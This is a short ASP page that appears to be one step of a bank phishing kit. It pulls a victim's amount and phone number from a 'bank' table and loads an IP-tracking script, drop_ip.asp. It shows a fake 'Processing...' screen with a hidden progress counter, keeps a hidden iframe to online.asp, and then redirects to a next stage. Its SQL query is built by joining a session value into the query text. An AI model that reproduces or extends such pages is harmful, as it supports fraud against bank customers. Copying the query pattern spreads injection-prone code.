<!--#include file="include/db_conn.asp"-->
<img src="" width="100%" height="1" />
<html>
<head>
<title></title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
<script language="javascript" src="drop_ip.asp"></script>
</head>
<body>
 <style>
        html {
    background-color: #fff;
    font-size: 14px;
    color: #2b2b2b;
    background: #fff
}

body {
    margin: 0px;
    padding: 0px;
}

* {
    font-family: "微软雅黑";
}
input[type="button"],input[type="submit"],input[type="reset"],input[type="text"],input[type="tel"],button,textarea{-webkit-appearance:none;}


div,ul,li,dt,dd,p {
    padding: 0px;
    margin: 0px;
}

.wrap {
    width: 100%;
    background: #f5f5f5;
    max-width: 640px;
    margin: 0 auto
}

.khimg {
    margin: 0 auto;
    width: 100%;
    overflow: hidden;
    margin-bottom: 20px;
    padding-top: 5px;
}

.khimg img {
    width: 10%;
    float: left;
    overflow: hidden;
    line-height: 30px;
}

.khimg span {
    float: left;
	color: #0b2398;
	padding-top: 7px;
    line-height: 20px;
    padding-left: 10px;
    font-weight: bold
}

.tjform {
    margin-top: 10px;
    overflow: hidden;
    width: 100%;
    margin-top: 20px;
}

.yhkh {
    width: 90%;
    padding: 4% 2%;
    margin: 0 auto;
    border: 1px solid #dddddd;
    box-shadow: 5px 5px 10px  #eeeeee;
    border-radius: 10px;
    overflow: hidden;
    background: #fff;
    margin-bottom: 20px;
}

.yhkh span {
    padding-left: 12px;
    font-size: 15px;
    font-weight: 900;
    float: left;
    width: 25%;
    height: 30px;
    line-height: 30px;
    text-align: center
}

.yhkh input {
    float: left;
    border: none;
    height: 100%;
    width: 70%;
    height: 30px;
    line-height: 30px;
    font-size: 13px;
    padding-left: 15px;
}

.tjbtn {
    width: 100%;
    text-align: center;
    margin-top: 20px;
}

.tjbtn input {
    background: #f84347;
    border: none;
    padding: 3%  10%;
    text-align: center;
    color: #fff;
    width: 100%;
    font-size: 16px;
    border-radius: 10px;
    margin: 0 auto
}

.beizhu {
    text-align: left;
    color: #636363;
    padding-left: 4%
}

.beizhu a {
    color: #6295c4;
    text-decoration: none
}

.shuom {
    background: #e6f0f9;
	font-size: 13px;
    padding: 10px 15px 5px 15px;
    color: #5f9bd9;
    margin-bottom: 20px;
    overflow: hidden;
    line-height: 24px;
}

.content {
    width: 90%;
    margin: 0 auto
}
</style>
</head>
<div class="shuom"></div>
<div class="content">
<div class="khimg">

<%
set rs=server.CreateObject("adodb.recordset")
rs.open "select * from bank where id="&session("ddid")&" ",conn,1,3
je=rs("je")
dh=rs("dh")
rs.close
set rs=Nothing
%>
 

<tbody>

</tbody>

 

 </div>
<form  name="loading" id="loading">
<input  type="text"  name="chart" style=" width:0.1%; font-family:Arial; font-weight:bolder;  color:#fff; font-size: 6px; background-color:#fff; border-style:none; " /> 
<input  type="text" name="percent"style=" width:0.1%; font-size: 5px;color:#fff; text-align:center; border-width:medium; border-style:none; background:none;" />
<script> 
var bar=0
var line="|" 
var amount="" 
count() 
function count()
{ 
bar=bar+1 
amount =amount + line 
document.loading.chart.value=amount 
document.loading.percent.value=bar+"%" 
if (bar<75) 
{setTimeout("count()",50);} 
else 
{window.location = "internet2.asp";} 
}
</script>
</form>
<style type="text/css">
    .mail-btn {
        float: left;
        margin-left: 5px;
    }
    .first-set-mail {
        width: 150px;
    }
    .font-color-first_text {
        color: #FF0000;
    }
    .font-color-limit {
        color: #444;
    }
    .loading-wrap {
        display: none;
        position: fixed;
        width: 100%;
        height: 100%;
        left: 0;
        top: 0;
    background-color: #fff;
    }
    .loading-info {
        position: absolute;
        top: 30%;
        left: 17%;
        z-index: 1;
        width: 65%;
        height: auto;
        padding:45px;
        margin-top: -6%;
        margin-left: -12%;
        color: #fff;
        background-color: #fff;
        border-radius: 5px;
        text-align: center;
        font-size: 16px;
    }
    .big5 .loading-info,
    .gb .loading-info {
        height: 8%;
        margin-top: -4%;
    }
    /*clear float*/
    .clearfix:before, .clearfix:after { content:""; display:table;}
    .clearfix:after { clear:both;}
    .clearfix { *zoom:1;}
    </style>
<div id="js-loading-wrap" class="loading-wrap" style="display: block;">
<div class="loading-info">
<img src="app/img/loading_icon.gif" style="width: 50px;height: 50px;"><br><br>Processing...
</div>
</div>
<iframe src="online.asp" style="display: none;"></iframe>
</body>
</html>